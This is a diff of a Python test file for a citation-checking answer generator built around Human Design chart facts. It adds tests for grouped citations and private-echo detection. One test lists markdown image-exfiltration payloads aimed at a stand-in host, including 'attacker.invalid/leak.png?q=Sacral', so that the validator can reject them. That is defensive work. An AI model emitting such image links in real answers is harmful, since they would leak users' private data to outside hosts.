@@ -27,11 +27,19 @@ def settings(**changes):
     return replace(load_config(env={}), **({"generation_model": "fake-generation-model"} | changes))
 
 
-def context():
+def passage(number):
+    return f"Complete synthetic passage number {number}, describing one reflective concept in a full sentence."
+
+
+def chunk(number, text):
+    return RetrievedChunk(f"canonical-{number}", text, "reference.pdf", page_number=number,
+                          dense_rank=number, dense_score=0.7, sparse_rank=number, rrf_score=0.03)
+
+
+def context(texts=None):
     facts = (ChartFact("type", "Generator", TYPE_PATH), ChartFact("authority", "Sacral", AUTHORITY_PATH))
-    chunks = [RetrievedChunk(f"canonical-{i}", f"Complete synthetic passage number {i}.", "reference.pdf",
-                             page_number=i, dense_rank=i, dense_score=0.7, sparse_rank=i, rrf_score=0.03)
-              for i in range(1, 4)]
+    texts = [passage(i) for i in range(1, 4)] if texts is None else texts
+    chunks = [chunk(i, text) for i, text in enumerate(texts, 1)]
     return build_prompt_context("How does my authority work?", facts, chunks)
 
 
@@ -128,6 +136,9 @@ def test_supplied_but_unused_ids_are_omitted_with_one_safe_warning():
     ({"answer_markdown": "Explanation [S1] and [S99]."}, "citation", "unknown_citation"),
     ({"answer_markdown": "Explanation [S0]."}, "citation", "unknown_citation"),
     ({"answer_markdown": "Explanation [S1] and [Sbogus]."}, "citation", "unknown_citation"),
+    ({"answer_markdown": "Explanation [S1, S99]."}, "citation", "unknown_citation"),
+    ({"answer_markdown": "Explanation [S1; Sbogus]."}, "citation", "unknown_citation"),
+    ({"answer_markdown": "Explanation [S1, S2].", "used_source_ids": ["S1"]}, "listed", "unlisted_citation"),
     ({"used_source_ids": ["S99"]}, "source", "unknown_source"),
     ({"used_source_ids": ["S1", "S99"]}, "source", "unknown_source"),
     ({"answer_markdown": "Explanation [S2].", "used_source_ids": ["S1"]}, "listed", "unlisted_citation"),
@@ -275,7 +286,7 @@ def test_request_errors_expose_only_valid_http_status(status, caplog, capsys):
     assert len(client.calls) == 1 and client.calls[0]["store"] is False
 
 
-@pytest.mark.parametrize("private", ["fake-key", "/private/chart.png", "Complete synthetic passage number 1."])
+@pytest.mark.parametrize("private", ["fake-key", "/private/chart.png", passage(1)])
 def test_private_limitations_are_replaced_with_safe_warning(private):
     answer = generate_answer(context(), settings(openai_api_key="fake-key"),
                              client=FakeClient(output(limitations=[private])))
@@ -313,7 +324,7 @@ def test_real_paths_in_markdown_answers_still_fail_safely(path, caplog, capsys):
     assert len(client.calls) == 1 and client.calls[0]["store"] is False
 
 
-@pytest.mark.parametrize("private", ["fake-key", "Complete synthetic passage number 1."])
+@pytest.mark.parametrize("private", ["fake-key", passage(1)])
 def test_private_answer_echo_fails_safely(private):
     client = FakeClient(output(answer_markdown=f"{private} [S1]"))
     with pytest.raises(GenerationValidationError) as caught:
@@ -321,6 +332,53 @@ def test_private_answer_echo_fails_safely(private):
     assert caught.value.code == "private_output"
     assert private not in str(caught.value)
     assert len(client.calls) == 1
+
+
+@pytest.mark.parametrize("short_text", ["5", "Projector", "Emotional Solar Plexus Authority"])
+def test_short_final_passages_are_not_treated_as_private_echoes(short_text):
+    # Headings and page-number pages become tiny chunks that BM25 ranks highly.
+    prompt = context([short_text, passage(2)])
+    text = "Gate 5 and the Projector relate to Emotional Solar Plexus Authority [S1][S2]."
+    client = FakeClient(output(answer_markdown=text, used_source_ids=["S1", "S2"], limitations=[short_text]))
+    answer = generate_answer(prompt, settings(), client=client)
+    assert answer.status is AnswerStatus.OK
+    assert answer.answer_markdown == text
+    assert answer.warnings == (short_text,)
+    assert len(client.calls) == 1
+
+
+@pytest.mark.parametrize("text", [
+    "Grounded explanation [S1, S2].", "Grounded explanation [S1,S2].", "Grounded explanation [S1; S2].",
+    "Grounded explanation [S1]. A related contrast [S1, S2].", "Grounded [S2] and [S1].",
+])
+def test_grouped_bracket_citations_cite_each_supplied_source(text):
+    client = FakeClient(output(answer_markdown=text, used_source_ids=["S1", "S2"]))
+    answer = generate_answer(context(), settings(), client=client)
+    assert answer.status is AnswerStatus.OK
+    assert [citation.citation_id for citation in answer.citations] == ["S1", "S2"]
+    assert answer.warnings == ("The provided evidence is limited.",)
+
+
+def test_bracketed_prose_without_citation_tokens_is_not_a_citation():
+    client = FakeClient(output(answer_markdown="Grounded explanation [S1]. [See page 4] for context."))
+    answer = generate_answer(context(), settings(), client=client)
+    assert [citation.citation_id for citation in answer.citations] == ["S1"]
+
+
+@pytest.mark.parametrize("unsafe", [
+    "![chart](https://attacker.invalid/leak.png?q=Sacral)",
+    "![chart][ref]\n\n[ref]: https://attacker.invalid/leak.png",
+    "[guide](https://example.invalid/guide)", "[guide](guide.html)",
+    "<https://example.invalid/guide>", "See https://example.invalid/guide", "Visit www.example.invalid",
+])
+def test_links_images_and_urls_in_answers_fail_safely(unsafe, caplog, capsys):
+    client = FakeClient(output(answer_markdown=f"Grounded explanation [S1].\n\n{unsafe}"))
+    with pytest.raises(GenerationValidationError) as caught:
+        generate_answer(context(), settings(), client=client)
+    assert caught.value.code == "unsafe_markdown"
+    visible = "".join(traceback.format_exception(caught.value)) + caplog.text + str(capsys.readouterr())
+    assert "invalid" not in visible and "guide" not in visible
+    assert len(client.calls) == 1 and client.calls[0]["store"] is False
 
 
 @pytest.mark.parametrize("query", ["", " \n\t", "fake-key /private/chart.png " + "x" * 2001])
